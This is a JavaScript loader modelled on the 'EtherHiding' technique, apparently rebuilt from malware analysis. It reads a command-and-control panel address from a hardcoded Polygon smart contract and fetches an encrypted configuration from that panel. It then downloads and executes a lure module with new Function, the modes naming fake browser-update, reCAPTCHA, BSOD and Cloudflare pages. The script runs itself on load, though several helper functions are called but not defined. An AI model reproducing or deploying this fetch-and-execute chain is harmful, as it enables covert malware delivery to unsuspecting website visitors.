(() => {
    "use strict";

    const CONTRACT =
        "0x994Cb8274721E5d6dAA4fE3FeBf80CF9237A9ae8";

    const SELECTOR =
        "0xb68d1809";

    const STATE_KEY =
        "site_repair_state";

    const API_PATH =
        "/api/index.php";

    const MODE_FILES = {
        browser: "v1.js",
        font: "v2.js",
        recaptcha: "v3.js",
        bsod: "v4.js",
        silent: "v5.js",
        cloudflare: "v6.js",
        cf_update: "v7.js",
        mac_recaptcha: "v8.js",
        mac_cloudflare: "v9.js"
    };

    /*
     * The EtherHiding stage performs an eth_call against the configured
     * contract. The returned ABI string contains the current panel URL.
     */
    async function resolvePanel(rpcUrl) {
        const response =
            await fetch(rpcUrl, {
                method: "POST",

                headers: {
                    "Content-Type":
                        "application/json"
                },

                body: JSON.stringify({
                    jsonrpc: "2.0",
                    id: 1,

                    method: "eth_call",

                    params: [
                        {
                            to: CONTRACT,
                            data: SELECTOR
                        },
                        "latest"
                    ]
                })
            });

        const body =
            await response.json();

        return decodeAbiString(
            body.result
        );
    }

    /*
     * Decode a dynamically sized ABI string returned by eth_call.
     */
    function decodeAbiString(value) {
        if (
            !value ||
            !value.startsWith("0x")
        ) {
            return "";
        }

        const hex =
            value.substring(2);

        const offset =
            parseInt(
                hex.substring(0, 64),
                16
            ) * 2;

        const length =
            parseInt(
                hex.substring(
                    offset,
                    offset + 64
                ),
                16
            );

        const start =
            offset + 64;

        const data =
            hex.substring(
                start,
                start + length * 2
            );

        let output = "";

        for (
            let index = 0;
            index < data.length;
            index += 2
        ) {
            output +=
                String.fromCharCode(
                    parseInt(
                        data.substring(
                            index,
                            index + 2
                        ),
                        16
                    )
                );
        }

        return output;
    }

    /*
     * Panel requests are serialized, encrypted and placed in q.
     *
     * The observed implementation supports RC4 q2 envelopes and AES-GCM
     * gcm1 responses.
     */
    async function panelRequest(
        panelBase,
        action,
        extra = {}
    ) {
        const parameters = {
            a: action,
            ...extra
        };

        const encrypted =
            encryptQuery(parameters);

        const url =
            panelBase +
            API_PATH +
            "?q=" +
            encodeURIComponent(encrypted);

        const response =
            await fetch(url);

        return decryptResponse(
            await response.text()
        );
    }

    async function loadConfiguration(
        panelBase
    ) {
        return panelRequest(
            panelBase,
            "cfg"
        );
    }

    async function loadMode(
        panelBase,
        mode
    ) {
        return panelRequest(
            panelBase,
            "js",
            {
                mode
            }
        );
    }

    async function run() {
        const rpcUrl =
            selectPolygonRpc();

        const panelBase =
            await resolvePanel(rpcUrl);

        const config =
            await loadConfiguration(
                panelBase
            );

        const mode =
            config.mode;

        const moduleSource =
            await loadMode(
                panelBase,
                mode
            );

        /*
         * The returned module exposes the campaign entry point.
         */
        new Function(
            moduleSource
        )();

        if (
            typeof window.__BW_MODE_RUN__ ===
            "function"
        ) {
            window.__BW_MODE_RUN__(
                config
            );
        }

        localStorage.setItem(
            STATE_KEY,
            JSON.stringify({
                mode,
                loaded: Date.now()
            })
        );
    }

    run();
})();


